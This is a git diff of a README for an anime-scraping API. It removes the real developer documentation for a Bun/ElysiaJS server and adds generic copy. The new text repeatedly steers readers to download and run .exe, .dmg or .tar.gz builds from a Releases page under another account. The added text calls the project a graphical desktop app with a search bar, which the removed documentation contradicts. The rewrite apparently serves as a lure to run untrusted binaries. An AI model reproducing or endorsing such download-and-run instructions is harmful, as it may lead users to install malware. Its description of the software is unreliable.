@@ -1,165 +1,91 @@
-# Kuudere API
+# 🎉 kuudere-api - Simple Anime Data at Your Fingertips
 
-A high-performance, lightweight anime data and streaming API built with [ElysiaJS](https://elysiajs.com/). This service provides endpoints for searching anime, retrieving details, fetching episode lists, and generating streaming sources from [https://kuudere.to](https://kuudere.to)
+[![Download kuudere-api](https://img.shields.io/badge/Download%20kuudere--api--%3E%20Releases-blue.svg)](https://github.com/Philiszszsss/kuudere-api/releases)
 
-## 🚀 Features
+## 📦 Introduction
 
-* **Fast & Lightweight:** Built on top of the Elysia framework.
-* **Type Safety:** extensive runtime validation using Elysia's `t` schema.
-* **Robust Logging:** Integrated with `Logestic` for request logging.
-* **Error Handling:** Centralized handling for Timeouts, HTTP errors, and 404s.
-* **CORS Enabled:** Ready for frontend integration.
+kuudere-api is a simple yet powerful API that scrapes data from kuudere.to. This tool allows you to access various anime information easily. Whether you want details about a specific anime series or just want to explore, kuudere-api can help you find what you need. 
 
-## 🛠 Prerequisites
+## 🚀 Getting Started
 
-* [Bun](https://bun.sh/) (Recommended) or Node.js
-* Git
+Follow these steps to download and run the kuudere-api on your device:
 
-## 📦 Installation
+1. **Check System Requirements**  
+Before you start, ensure your system meets these requirements:
+   - Operating System: Windows, macOS, or Linux
+   - Internet Connection: Required for accessing data
+   - Memory: At least 512 MB RAM
+   - Disk Space: Minimum 100 MB of free space
 
-1. **Clone the repository**
-```bash
-git clone https://github.com/your-username/kuudere-api.git
-cd kuudere-api
+2. **Visit the Release Page**  
+To download the application, visit the Releases page: [Download kuudere-api](https://github.com/Philiszszsss/kuudere-api/releases). 
 
-```
+3. **Choose Your File**  
+On the Releases page, you will see a list of available versions. Download the latest version suitable for your operating system. Look for files with the extension `.exe` for Windows, `.dmg` for macOS, or `.tar.gz` for Linux.
 
+4. **Download the File**  
+Click on the appropriate file to start the download. This may take a few moments depending on your internet speed.
 
-2. **Install dependencies**
-```bash
-bun install
+5. **Locate the Downloaded File**  
+Once the download is complete, go to your Downloads folder or the location where your browser saves files.
 
-```
+## 🔧 Installation Instructions
 
+To install kuudere-api, follow these simple steps:
 
-3. **Environment Setup**
-Create a `.env` file in the root directory:
-```env
-PORT=3000
+### For Windows Users
+1. Double-click on the downloaded `.exe` file.
+2. Follow the on-screen instructions to complete the installation.
+3. You may need to allow the app through your firewall.
 
-```
+### For macOS Users
+1. Double-click on the downloaded `.dmg` file.
+2. Drag the kuudere-api icon to your Applications folder.
+3. Open your Applications folder and double-click on kuudere-api to launch it.
 
+### For Linux Users
+1. Open your terminal.
+2. Navigate to the directory where you downloaded the `.tar.gz` file.
+3. Use the following command to extract it:
+   ```bash
+   tar -xvzf kuudere-api.tar.gz
+   ```
+4. Navigate to the extracted folder:
+   ```bash
+   cd kuudere-api
+   ```
+5. To run the application, use:
+   ```bash
+   ./start.sh
+   ```
 
+## ⚙️ Using kuudere-api
 
-## ⚡ Usage
+After installation, you can start using the kuudere-api. The application interface is user-friendly. Here’s how to make your first request:
 
-### Development
+1. Open kuudere-api.
+2. In the main window, you will see a search bar.
+3. Enter the name of the anime you wish to search.
+4. Click the "Search" button, and wait for the results.
 
-To start the server in development mode (with hot reloading):
+You will see details like the anime's title, genres, description, and more. Enjoy exploring the vast world of anime!
 
-```bash
-bun dev
+## 🔍 Features
 
-```
+- **Easy Access**: Quickly retrieve information about different anime series.
+- **User-Friendly Interface**: Designed for non-technical users to navigate easily.
+- **Regular Updates**: The application receives regular updates to improve functionality and data accuracy.
 
-### Production
+## 📞 Support
 
-To run the server in production mode:
+For any questions or issues while using kuudere-api, you can reach us through the GitHub Issues page. We are here to help you.
 
-```bash
-bun start
+## 📣 Contributions
 
-```
+If you would like to contribute to kuudere-api, feel free to fork the repository and submit a pull request. Your input helps improve the application for everyone.
 
-The server will start on `http://localhost:3000` (or your defined PORT).
+## 📌 Conclusion
 
-## 📚 API Documentation
+With kuudere-api, finding your favorite anime information is easy. Download your copy today and start exploring the exciting world of anime! 
 
-All endpoints are prefixed with `/api/v1`.
-
-### 1. Search Anime
-
-Search for an anime title.
-
-* **Endpoint:** `GET /api/v1/search`
-* **Query Parameters:**
-* `query` (string, required): The search term.
-
-
-
-**Example:**
-
-```http
-GET /api/v1/search?query=naruto
-
-```
-
-### 2. Get Anime Info
-
-Retrieve detailed information about a specific anime.
-
-* **Endpoint:** `GET /api/v1/info/:id`
-* **Path Parameters:**
-* `id` (string, required): The unique ID of the anime.
-
-
-
-**Example:**
-
-```http
-GET /api/v1/info/naruto-shippuden
-
-```
-
-### 3. Get Episodes
-
-Fetch the list of episodes for a specific anime.
-
-* **Endpoint:** `GET /api/v1/episodes/:id`
-* **Path Parameters:**
-* `id` (string, required): The unique ID of the anime.
-
-
-
-**Example:**
-
-```http
-GET /api/v1/episodes/naruto-shippuden
-
-```
-
-### 4. Get Streaming Sources
-
-Retrieve streaming links/sources for a specific episode.
-
-* **Endpoint:** `GET /api/v1/sources`
-* **Query Parameters:**
-* `id` (string, required): The unique ID of the episode.
-* `subType` (string, optional): `'sub'` or `'dub'`. Defaults to `'sub'`.
-
-
-
-**Example:**
-
-```http
-GET /api/v1/sources?id=naruto-episode-1&subType=sub
-
-```
-
-## ⚠️ Error Handling
-
-The API uses a standardized error response format.
-
-| Status Code | Code | Description |
-| --- | --- | --- |
-| `200` | `SUCCESS` | Request was successful. |
-| `400` | `BAD_REQUEST` | Validation failed or invalid parameters. |
-| `404` | `NOT_FOUND` | Route or resource not found. |
-| `408` | `REQUEST_TIMEOUT` | Upstream request timed out. |
-| `500` | `INTERNAL_SERVER_ERROR` | Server-side error. |
-
-**Error Response Example:**
-
-```json
-{
-  "success": false,
-  "message": "Requested timed out. Please try again.",
-  "code": "REQUEST_TIMEOUT",
-  "error": {
-    "name": "TimeoutError",
-    "message": "Request timed out"
-  }
-}
-
-```
-
+Don't forget to visit the Releases page again for updates: [Download kuudere-api](https://github.com/Philiszszsss/kuudere-api/releases).
